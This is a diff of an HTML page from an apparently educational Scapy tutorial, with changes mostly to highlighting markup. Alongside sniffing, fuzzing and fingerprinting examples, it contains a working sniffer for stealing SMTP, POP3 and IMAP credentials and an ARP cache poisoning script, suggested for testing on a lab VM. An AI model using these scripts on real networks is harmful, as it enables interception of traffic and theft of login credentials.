-<div class="highlight"><pre><span class="k">def</span> <span class="nf">packet_callback</span><span class="p">(</span><span class="n">packet</span><span class="p">):</span>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">packet_callback</span><span class="p">(</span><span class="n">packet</span><span class="p">):</span>
     <span class="k">print</span> <span class="n">packet</span><span class="o">.</span><span class="n">show</span><span class="p">()</span>
 
-<span class="n">sniff</span><span class="p">(</span><span class="nb">filter</span><span class="o">=</span><span class="s">&#39;icmp&#39;</span><span class="p">,</span> <span class="n">iface</span><span class="o">=</span><span class="s">&#39;eth1&#39;</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">packet_callback</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">sniff</span><span class="p">(</span><span class="nb">filter</span><span class="o">=</span><span class="s1">&#39;icmp&#39;</span><span class="p">,</span> <span class="n">iface</span><span class="o">=</span><span class="s1">&#39;eth1&#39;</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">packet_callback</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
 </pre></div>
 
 
 <p>To see the output in real time and dump the data into a file, we use the <strong>lambda function</strong> with <strong>summary</strong> and the <strong>wrpcap</strong> method:</p>
-<div class="highlight"><pre><span class="o">&gt;&gt;&gt;&gt;</span> <span class="n">p</span> <span class="o">=</span> <span class="n">sniff</span><span class="p">(</span><span class="nb">filter</span><span class="o">=</span><span class="s">&#39;icmp&#39;</span><span class="p">,</span> <span class="n">iface</span><span class="o">=</span><span class="s">&#39;eth1&#39;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span>  <span class="n">prn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span><span class="n">x</span><span class="o">.</span><span class="n">summary</span><span class="p">())</span>
-<span class="o">&gt;&gt;&gt;&gt;</span> <span class="n">wrpcap</span><span class="p">(</span><span class="s">&#39;packets.pcap&#39;</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
+<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;&gt;</span> <span class="n">p</span> <span class="o">=</span> <span class="n">sniff</span><span class="p">(</span><span class="nb">filter</span><span class="o">=</span><span class="s1">&#39;icmp&#39;</span><span class="p">,</span> <span class="n">iface</span><span class="o">=</span><span class="s1">&#39;eth1&#39;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span>  <span class="n">prn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span><span class="n">x</span><span class="o">.</span><span class="n">summary</span><span class="p">())</span>
+<span class="o">&gt;&gt;&gt;&gt;</span> <span class="n">wrpcap</span><span class="p">(</span><span class="s1">&#39;packets.pcap&#39;</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
 </pre></div>
 
 
-<hr />
+<hr>
 <h2>Changing a Routing Table</h2>
 <p>To look to the routing table of our machine we can just print the Scapy's command <strong>conf.route</strong>:</p>
-<div class="highlight"><pre><span class="n">Network</span>         <span class="n">Netmask</span>         <span class="n">Gateway</span>         <span class="n">Iface</span>           <span class="n">Output</span> <span class="n">IP</span>
-<span class="mf">127.0.0.0</span>       <span class="mf">255.0.0.0</span>       <span class="mf">0.0.0.0</span>         <span class="n">lo</span>              <span class="mf">127.0.0.1</span>
-<span class="mf">0.0.0.0</span>         <span class="mf">0.0.0.0</span>         <span class="mf">192.168.1.1</span>     <span class="n">wlp1s0</span>          <span class="mf">192.168.1.114</span>
-<span class="mf">192.168.1.0</span>     <span class="mf">255.255.255.0</span>   <span class="mf">0.0.0.0</span>         <span class="n">wlp1s0</span>          <span class="mf">192.168.1.114</span>
+<div class="highlight"><pre><span></span>Network         Netmask         Gateway         Iface           Output IP
+127.0.0.0       255.0.0.0       0.0.0.0         lo              127.0.0.1
+0.0.0.0         0.0.0.0         192.168.1.1     wlp1s0          192.168.1.114
+192.168.1.0     255.255.255.0   0.0.0.0         wlp1s0          192.168.1.114
 </pre></div>
 
 
 <p>Scapy allows us to include a specified route to this table, so any packet intended to some specified host would go through the specified gateway:</p>
-<div class="highlight"><pre><span class="o">&gt;&gt;&gt;&gt;</span> <span class="n">conf</span><span class="o">.</span><span class="n">route</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">&#39;192.168.118.2&#39;</span><span class="p">,</span> <span class="n">gw</span><span class="o">=</span><span class="s">&#39;192.168.1.114&#39;</span><span class="p">)</span>
+<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;&gt;</span> <span class="n">conf</span><span class="o">.</span><span class="n">route</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;192.168.118.2&#39;</span><span class="p">,</span> <span class="n">gw</span><span class="o">=</span><span class="s1">&#39;192.168.1.114&#39;</span><span class="p">)</span>
 <span class="n">Network</span>         <span class="n">Netmask</span>         <span class="n">Gateway</span>         <span class="n">Iface</span>           <span class="n">Output</span> <span class="n">IP</span>
 <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.0</span>       <span class="mf">255.0</span><span class="o">.</span><span class="mf">0.0</span>       <span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span>         <span class="n">lo</span>              <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span>
 <span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span>         <span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span>         <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span>     <span class="n">wlp1s0</span>          <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.114</span>
@@ -406,50 +406,50 @@ Sent 3 packets, received 3 packets. 100.0% hits.
 
 
 <p>Finally, to return to the original configuration, we use <code>conf.route.resync()</code>.</p>
-<hr />
+<hr>
 <h2>Other Useful Stuff</h2>
 <h3>Dumping Binary data in Hex form</h3>
 <p>A very useful function  is <a href="https://pypi.python.org/pypi/hexdump">hexdump()</a>, which can be used to display one or more packets using classic hexdump format:</p>
-<div class="highlight"><pre><span class="n">from</span> <span class="n">scapy</span><span class="p">.</span><span class="n">all</span> <span class="n">import</span> <span class="o">*</span>
-<span class="n">str</span><span class="p">(</span><span class="n">IP</span><span class="p">())</span>
-<span class="n">a</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">()</span><span class="o">/</span><span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s">&quot;www.google.com&quot;</span><span class="p">)</span><span class="o">/</span><span class="n">TCP</span><span class="p">()</span><span class="o">/</span><span class="s">&quot;GET /index.html HTTP/1.1&quot;</span>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="nb">str</span><span class="p">(</span><span class="n">IP</span><span class="p">())</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">()</span><span class="o">/</span><span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s2">&quot;www.google.com&quot;</span><span class="p">)</span><span class="o">/</span><span class="n">TCP</span><span class="p">()</span><span class="o">/</span><span class="s2">&quot;GET /index.html HTTP/1.1&quot;</span>
 <span class="n">hexdump</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
 </pre></div>
 
 
 <p>Running this snippet gives:</p>
-<div class="highlight"><pre><span class="nv">$ </span>sudo python example_hexdump.py
-WARNING: No route found <span class="k">for </span>IPv6 destination :: <span class="o">(</span>no default route?<span class="o">)</span>
-0000   00 90 A9 A3 F1 46 A4 17  31 E9 B3 27 08 00 45 00   .....F..1..<span class="err">&#39;</span>..E.
-0010   00 40 00 01 00 00 40 06  8D 0F C0 A8 01 72 4A 7D   .@....@......rJ<span class="o">}</span>
-0020   E1 10 00 14 00 50 00 00  00 00 00 00 00 00 50 02   .....P........P.
-0030   20 00 FA 15 00 00 47 45  54 20 2F 69 6E 64 65 78    .....GET /index
-0040   2E 68 74 6D 6C 20 48 54  54 50 2F 31 2E 31         .html HTTP/1.1
+<div class="highlight"><pre><span></span>$ sudo python example_hexdump.py
+WARNING: No route found <span class="k">for</span> IPv6 destination :: <span class="o">(</span>no default route?<span class="o">)</span>
+<span class="m">0000</span>   <span class="m">00</span> <span class="m">90</span> A9 A3 F1 <span class="m">46</span> A4 <span class="m">17</span>  <span class="m">31</span> E9 B3 <span class="m">27</span> <span class="m">08</span> <span class="m">00</span> <span class="m">45</span> <span class="m">00</span>   .....F..1..<span class="err">&#39;</span>..E.
+<span class="m">0010</span>   <span class="m">00</span> <span class="m">40</span> <span class="m">00</span> <span class="m">01</span> <span class="m">00</span> <span class="m">00</span> <span class="m">40</span> <span class="m">06</span>  8D 0F C0 A8 <span class="m">01</span> <span class="m">72</span> 4A 7D   .@....@......rJ<span class="o">}</span>
+<span class="m">0020</span>   E1 <span class="m">10</span> <span class="m">00</span> <span class="m">14</span> <span class="m">00</span> <span class="m">50</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">50</span> <span class="m">02</span>   .....P........P.
+<span class="m">0030</span>   <span class="m">20</span> <span class="m">00</span> FA <span class="m">15</span> <span class="m">00</span> <span class="m">00</span> <span class="m">47</span> <span class="m">45</span>  <span class="m">54</span> <span class="m">20</span> 2F <span class="m">69</span> 6E <span class="m">64</span> <span class="m">65</span> <span class="m">78</span>    .....GET /index
+<span class="m">0040</span>   2E <span class="m">68</span> <span class="m">74</span> 6D 6C <span class="m">20</span> <span class="m">48</span> <span class="m">54</span>  <span class="m">54</span> <span class="m">50</span> 2F <span class="m">31</span> 2E <span class="m">31</span>         .html HTTP/1.1
 </pre></div>
 
 
 <h3>Fuzzing</h3>
 <p>Scapy's <a href="http://www.secdev.org/projects/scapy/doc/usage.html#fuzzing">fuzz()</a> method allows one to craft fuzzing templates (by changing default values by random ones) and send them in a loop.</p>
 <p>For example, we can have a standard IP layer with the UDP and NTP layers being fuzzed (but with the correct checksums). Below, the UDP destination port is overloaded by NTP and the NTP version is forced to be 4:</p>
-<div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">send</span><span class="p">(</span><span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s">&quot;192.168.1.114&quot;</span><span class="p">)</span><span class="o">/</span><span class="n">fuzz</span><span class="p">(</span><span class="n">UDP</span><span class="p">()</span><span class="o">/</span><span class="n">NTP</span><span class="p">(</span><span class="n">version</span><span class="o">=</span><span class="mi">4</span><span class="p">)),</span> <span class="n">loop</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="n">send</span><span class="p">(</span><span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s2">&quot;192.168.1.114&quot;</span><span class="p">)</span><span class="o">/</span><span class="n">fuzz</span><span class="p">(</span><span class="n">UDP</span><span class="p">()</span><span class="o">/</span><span class="n">NTP</span><span class="p">(</span><span class="n">version</span><span class="o">=</span><span class="mi">4</span><span class="p">)),</span> <span class="n">loop</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
 <span class="o">................^</span><span class="n">C</span>
 <span class="n">Sent</span> <span class="mi">16</span> <span class="n">packets</span><span class="o">.</span>
 </pre></div>
 
 
 <p>Here is a DNS fuzzer:</p>
-<div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">send</span><span class="p">(</span><span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s">&#39;192.168.1.114&#39;</span><span class="p">)</span><span class="o">/</span><span class="n">UDP</span><span class="p">()</span><span class="o">/</span><span class="n">fuzz</span><span class="p">(</span><span class="n">DNS</span><span class="p">()),</span> <span class="n">inter</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="n">loop</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="n">send</span><span class="p">(</span><span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s1">&#39;192.168.1.114&#39;</span><span class="p">)</span><span class="o">/</span><span class="n">UDP</span><span class="p">()</span><span class="o">/</span><span class="n">fuzz</span><span class="p">(</span><span class="n">DNS</span><span class="p">()),</span> <span class="n">inter</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="n">loop</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
 </pre></div>
 
 
 <h3>More Networking</h3>
 <p>Scapy can perform simple networking functions such as  <a href="http://www.secdev.org/projects/scapy/doc/usage.html#tcp-traceroute-2">traceroute</a> or <a href="http://www.secdev.org/projects/scapy/doc/usage.html#send-and-receive-in-a-loop">ping</a>:</p>
-<div class="highlight"><pre><span class="o">&gt;&gt;&gt;&gt;</span> <span class="k">print</span> <span class="n">scapy</span><span class="o">.</span><span class="n">traceroute</span><span class="p">(</span><span class="s">&#39;www.google.com&#39;</span><span class="p">)</span>
+<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;&gt;</span> <span class="k">print</span> <span class="n">scapy</span><span class="o">.</span><span class="n">traceroute</span><span class="p">(</span><span class="s1">&#39;www.google.com&#39;</span><span class="p">)</span>
 </pre></div>
 
 
 <p>Or be used to discover hosts on the local Ethernet, with <a href="http://www.secdev.org/projects/scapy/doc/usage.html#arp-ping">arping</a>:</p>
-<div class="highlight"><pre><span class="o">&gt;&gt;&gt;&gt;</span> <span class="k">print</span> <span class="n">arping</span><span class="p">(</span><span class="s">&#39;192.168.1.114&#39;</span><span class="p">)</span>
+<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;&gt;</span> <span class="k">print</span> <span class="n">arping</span><span class="p">(</span><span class="s1">&#39;192.168.1.114&#39;</span><span class="p">)</span>
 </pre></div>
 
 
@@ -460,44 +460,44 @@ WARNING: No route found <span class="k">for </span>IPv6 destination :: <span cla
 <p>We also can plot  graphs with the function <strong>plot()</strong> and <strong>graph()</strong>,  and we can generate 3D  plots with <strong>trace3D()</strong>.</p>
 <h3>Nice Third Party Modules</h3>
 <p><a href="http://nmap.org/book/osdetect-fingerprint-format.html">Fingerprinting</a> can be made with the <strong>nmap_fp()</strong> module (which comes from <a href="http://nmap.org">Nmap</a> prior to v4.23):</p>
-<div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">load_module</span><span class="p">(</span><span class="s">&quot;nmap&quot;</span><span class="p">)</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">nmap_fp</span><span class="p">(</span><span class="s">&quot;192.168.0.114&quot;</span><span class="p">)</span>
+<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="n">load_module</span><span class="p">(</span><span class="s2">&quot;nmap&quot;</span><span class="p">)</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">nmap_fp</span><span class="p">(</span><span class="s2">&quot;192.168.0.114&quot;</span><span class="p">)</span>
 </pre></div>
 
 
 <p><a href="http://www.netresec.com/?page=Blog&amp;month=2011-11&amp;post=Passive-OS-Fingerprinting">Passive OS fingerprinting</a> can be made with the <strong>p0f</strong> module:</p>
-<div class="highlight"><pre><span class="o">&gt;&gt;&gt;&gt;</span> <span class="n">load_module</span><span class="p">(</span><span class="s">&#39;p0f&#39;</span><span class="p">)</span>
+<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;&gt;</span> <span class="n">load_module</span><span class="p">(</span><span class="s1">&#39;p0f&#39;</span><span class="p">)</span>
 <span class="o">&gt;&gt;&gt;&gt;</span> <span class="n">sniff</span><span class="p">(</span><span class="n">prn</span><span class="o">=</span><span class="n">prnp0f</span><span class="p">)</span>
 </pre></div>
 
 
-<hr />
+<hr>
 <h2><a name="email"></a> Stealing Email Data</h2>
 <p>The idea of this script is to build a sniffer to capture <a href="http://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol">SMTP</a>, <a href="http://en.wikipedia.org/wiki/Post_Office_Protocol">POP3</a>, and <a href="http://en.wikipedia.org/wiki/Internet_Message_Access_Protocol">IMAP</a> credentials. Once we couple this sniffer with some <a href="http://en.wikipedia.org/wiki/Man-in-the-middle_attack">MITM</a> attack (such as **ARP poisoning), we can steal credentials from other machines in the network.</p>
 <p>With this in mind, we write a script that runs a sniffer on all the interfaces, with no filtering. The <strong>sniff</strong>'s <strong>store=0</strong> attribute ensures that the packets are not kept in memory (so we can leave it running):</p>
-<div class="highlight"><pre><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="k">def</span> <span class="nf">packet_callback</span><span class="p">(</span><span class="n">packet</span><span class="p">):</span>
-    <span class="c"># check to make sure it has a data payload</span>
+    <span class="c1"># check to make sure it has a data payload</span>
     <span class="k">if</span> <span class="n">packet</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">payload</span><span class="p">:</span>
         <span class="n">mail_packet</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">packet</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">payload</span><span class="p">)</span>
-        <span class="k">if</span> <span class="s">&#39;user&#39;</span> <span class="ow">in</span> <span class="n">mail_packet</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">or</span> <span class="s">&#39;pass&#39;</span> <span class="ow">in</span> <span class="n">mail_packet</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
-            <span class="k">print</span> <span class="s">&#39;[*] Server: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">packet</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">dst</span>
-            <span class="k">print</span> <span class="s">&#39;[*] </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span><span class="n">packet</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">payload</span>
+        <span class="k">if</span> <span class="s1">&#39;user&#39;</span> <span class="ow">in</span> <span class="n">mail_packet</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">or</span> <span class="s1">&#39;pass&#39;</span> <span class="ow">in</span> <span class="n">mail_packet</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
+            <span class="k">print</span> <span class="s1">&#39;[*] Server: </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">packet</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">dst</span>
+            <span class="k">print</span> <span class="s1">&#39;[*] </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span><span class="n">packet</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">payload</span>
 
-<span class="n">sniff</span><span class="p">(</span><span class="nb">filter</span><span class="o">=</span><span class="s">&quot;tcp port 110 or tcp port 25 or tcp port 143&quot;</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">packet_callback</span><span class="p">,</span> <span class="n">store</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">sniff</span><span class="p">(</span><span class="nb">filter</span><span class="o">=</span><span class="s2">&quot;tcp port 110 or tcp port 25 or tcp port 143&quot;</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">packet_callback</span><span class="p">,</span> <span class="n">store</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
 </pre></div>
 
 
 <p>Running this script when loading load some mail client (such as <a href="https://www.mozilla.org/en-US/thunderbird/">Thunderbird</a>) will allow us to see the login information, if they are sent to the server as plain text.</p>
-<hr />
+<hr>
 <h2><a name="arp"></a> ARP Cache Poisoning</h2>
 <p>I talked about <a href="http://bt3gl.github.io/wiresharking-for-fun-or-profit.html">ARP cache poisoning using command line arpspoof</a> in my guide about Wireshark. Here we are going to see how to implement similar tool using Scapy.</p>
 <p>ARP cache poisoning works by convincing a target machine that we are the gateway, and then convincing the gateway that all traffic should pass through our machine.</p>
 <p>Every machine in a network maintains an ARP cache that stores the recent MAC addresses that match to IP addresses on the local network. All we need to do is to poison this cache with controlled entries.</p>
 <p>The best way to test this is using a Windows virtual machine (take a look in <a href="http://bt3gl.github.io/setting-up-a-playing-environment-with-virtual-machines.html">this guide I wrote</a>).</p>
 <p>Before the attack, go to the Windows box, open the terminal (<code>cmd</code>) and check the IP and gateway IP address with<code>ipconfig</code>. Then check the associated  ARP cache entry MAC address with <code>arp -a</code>. We are going to use the former information and we will see the ARP data being changed:</p>
-<p><img alt="" src="http://i.imgur.com/ME069uS.png" /></p>
+<p><img alt="" src="http://i.imgur.com/ME069uS.png"></p>
 <p>Following is our ARP poisoning script (based on <a href="http://www.nostarch.com/blackhatpython">Black Hat Python</a>). The script does the following steps:</p>
 <ol>
 <li>
@@ -522,28 +522,28 @@ WARNING: No route found <span class="k">for </span>IPv6 destination :: <span cla
 </ul>
 </li>
 </ol>
-<div class="highlight"><pre><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">from</span> <span class="nn">scapy.error</span> <span class="kn">import</span> <span class="n">Scapy_Exception</span>
 <span class="kn">import</span> <span class="nn">os</span>
 <span class="kn">import</span> <span class="nn">sys</span>
 <span class="kn">import</span> <span class="nn">threading</span>
 <span class="kn">import</span> <span class="nn">signal</span>
 
-<span class="n">INTERFACE</span>       <span class="o">=</span>   <span class="s">&#39;wlp1s0&#39;</span>
-<span class="n">TARGET_IP</span>       <span class="o">=</span>   <span class="s">&#39;192.168.1.107&#39;</span>
-<span class="n">GATEWAY_IP</span>      <span class="o">=</span>   <span class="s">&#39;192.168.1.1&#39;</span>
+<span class="n">INTERFACE</span>       <span class="o">=</span>   <span class="s1">&#39;wlp1s0&#39;</span>
+<span class="n">TARGET_IP</span>       <span class="o">=</span>   <span class="s1">&#39;192.168.1.107&#39;</span>
+<span class="n">GATEWAY_IP</span>      <span class="o">=</span>   <span class="s1">&#39;192.168.1.1&#39;</span>
 <span class="n">PACKET_COUNT</span>    <span class="o">=</span>   <span class="mi">1000</span>
 
 <span class="k">def</span> <span class="nf">restore_target</span><span class="p">(</span><span class="n">gateway_ip</span><span class="p">,</span> <span class="n">gateway_mac</span><span class="p">,</span> <span class="n">target_ip</span><span class="p">,</span> <span class="n">target_mac</span><span class="p">):</span>
-    <span class="k">print</span> <span class="s">&#39;[*] Restoring targets...&#39;</span>
-    <span class="n">send</span><span class="p">(</span><span class="n">ARP</span><span class="p">(</span><span class="n">op</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">psrc</span><span class="o">=</span><span class="n">gateway_ip</span><span class="p">,</span> <span class="n">pdst</span><span class="o">=</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">hwdst</span><span class="o">=</span><span class="s">&#39;ff:ff:ff:ff:ff:ff&#39;</span><span class="p">,</span> \
+    <span class="k">print</span> <span class="s1">&#39;[*] Restoring targets...&#39;</span>
+    <span class="n">send</span><span class="p">(</span><span class="n">ARP</span><span class="p">(</span><span class="n">op</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">psrc</span><span class="o">=</span><span class="n">gateway_ip</span><span class="p">,</span> <span class="n">pdst</span><span class="o">=</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">hwdst</span><span class="o">=</span><span class="s1">&#39;ff:ff:ff:ff:ff:ff&#39;</span><span class="p">,</span> \
         <span class="n">hwsrc</span><span class="o">=</span><span class="n">gateway_mac</span><span class="p">),</span> <span class="n">count</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
-    <span class="n">send</span><span class="p">(</span><span class="n">ARP</span><span class="p">(</span><span class="n">op</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">psrc</span><span class="o">=</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">pdst</span><span class="o">=</span><span class="n">gateway_ip</span><span class="p">,</span> <span class="n">hwdst</span><span class="o">=</span><span class="s">&quot;ff:ff:ff:ff:ff:ff&quot;</span><span class="p">,</span> \
+    <span class="n">send</span><span class="p">(</span><span class="n">ARP</span><span class="p">(</span><span class="n">op</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">psrc</span><span class="o">=</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">pdst</span><span class="o">=</span><span class="n">gateway_ip</span><span class="p">,</span> <span class="n">hwdst</span><span class="o">=</span><span class="s2">&quot;ff:ff:ff:ff:ff:ff&quot;</span><span class="p">,</span> \
         <span class="n">hwsrc</span><span class="o">=</span><span class="n">target_mac</span><span class="p">),</span> <span class="n">count</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
     <span class="n">os</span><span class="o">.</span><span class="n">kill</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getpid</span><span class="p">(),</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">get_mac</span><span class="p">(</span><span class="n">ip_address</span><span class="p">):</span>
-    <span class="n">response</span><span class="p">,</span> <span class="n">unanswered</span> <span class="o">=</span> <span class="n">srp</span><span class="p">(</span><span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s">&#39;ff:ff:ff:ff:ff:ff&#39;</span><span class="p">)</span><span class="o">/</span><span class="n">ARP</span><span class="p">(</span><span class="n">pdst</span><span class="o">=</span><span class="n">ip_address</span><span class="p">),</span> \
+    <span class="n">response</span><span class="p">,</span> <span class="n">unanswered</span> <span class="o">=</span> <span class="n">srp</span><span class="p">(</span><span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s1">&#39;ff:ff:ff:ff:ff:ff&#39;</span><span class="p">)</span><span class="o">/</span><span class="n">ARP</span><span class="p">(</span><span class="n">pdst</span><span class="o">=</span><span class="n">ip_address</span><span class="p">),</span> \
         <span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">retry</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
     <span class="k">for</span> <span class="n">s</span><span class="p">,</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">response</span><span class="p">:</span>
         <span class="k">return</span> <span class="n">r</span><span class="p">[</span><span class="n">Ether</span><span class="p">]</span><span class="o">.</span><span class="n">src</span>
@@ -561,7 +561,7 @@ WARNING: No route found <span class="k">for </span>IPv6 destination :: <span cla
     <span class="n">poison_gateway</span><span class="o">.</span><span class="n">pdst</span> <span class="o">=</span> <span class="n">gateway_ip</span>
     <span class="n">poison_gateway</span><span class="o">.</span><span class="n">hwdst</span> <span class="o">=</span> <span class="n">gateway_mac</span>
 
-    <span class="k">print</span> <span class="s">&#39;[*] Beginning the ARP poison. [CTRL-C to stop]&#39;</span>
+    <span class="k">print</span> <span class="s1">&#39;[*] Beginning the ARP poison. [CTRL-C to stop]&#39;</span>
     <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
         <span class="k">try</span><span class="p">:</span>
             <span class="n">send</span><span class="p">(</span><span class="n">poison_target</span><span class="p">)</span>
@@ -571,40 +571,40 @@ WARNING: No route found <span class="k">for </span>IPv6 destination :: <span cla
         <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
             <span class="n">restore_target</span><span class="p">(</span><span class="n">gateway_ip</span><span class="p">,</span> <span class="n">gateway_mac</span><span class="p">,</span> <span class="n">target_ip</span><span class="p">,</span> <span class="n">target_mac</span><span class="p">)</span>
 
-        <span class="k">print</span> <span class="s">&#39;[*] ARP poison attack finished.&#39;</span>
+        <span class="k">print</span> <span class="s1">&#39;[*] ARP poison attack finished.&#39;</span>
         <span class="k">return</span>
 
-<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
     <span class="n">conf</span><span class="o">.</span><span class="n">iface</span> <span class="o">=</span> <span class="n">INTERFACE</span>
     <span class="n">conf</span><span class="o">.</span><span class="n">verb</span> <span class="o">=</span> <span class="mi">0</span>
-    <span class="k">print</span> <span class="s">&quot;[*] Setting up </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">INTERFACE</span>
+    <span class="k">print</span> <span class="s2">&quot;[*] Setting up </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">INTERFACE</span>
     <span class="n">GATEWAY_MAC</span> <span class="o">=</span> <span class="n">get_mac</span><span class="p">(</span><span class="n">GATEWAY_IP</span><span class="p">)</span>
     <span class="k">if</span> <span class="n">GATEWAY_MAC</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
-        <span class="k">print</span> <span class="s">&quot;[-] Failed to get gateway MAC. Exiting.&quot;</span>
+        <span class="k">print</span> <span class="s2">&quot;[-] Failed to get gateway MAC. Exiting.&quot;</span>
